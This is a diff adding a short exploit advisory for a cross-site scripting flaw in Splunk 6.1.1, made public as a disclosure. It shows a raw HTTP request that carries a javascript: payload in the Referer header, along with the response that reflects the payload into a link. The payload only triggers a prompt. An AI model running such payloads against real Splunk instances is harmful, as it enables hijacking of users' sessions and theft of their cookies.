@@ -1,0 +1,29 @@
+# Exploit Title: Splunk 'Referer' Header Cross Site Scripting Vulnerability
+# Date: 7th January 2017
+# Exploit Author: justpentest
+# Vendor Homepage: http://www.splunk.com/
+# Version: Splunk 6.1.1 other versions may also be affected.
+# Contact: transform2secure@gmail.com
+
+
+Source: http://www.securityfocus.com/bid/67655/info
+ 
+1) Description:
+Splunk is prone to a cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied input.
+An attacker may leverage this issue to execute arbitrary script code in an unsuspecting user's browser in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+ 
+2) Exploit:
+ 
+URL: http://justpentest.com:8000/en-US/app/
+ 
+GET /en-US/app/ HTTP/1.1
+Host=justpentest.com:8000
+User-Agent=Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0
+Accept=text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language=en-US,en;q=0.5
+Accept-Encoding=gzip, deflate
+Referer=javascript:prompt("XXS by justpentest");
+Connection=keep-alive
+----------------------------------------------------------------------------------------
+Response:
+ <p>This page was linked to from <a href="javascript:prompt("XXS by justpentest");">javascript:prompt("XXS by justpentest");</a>.</p>
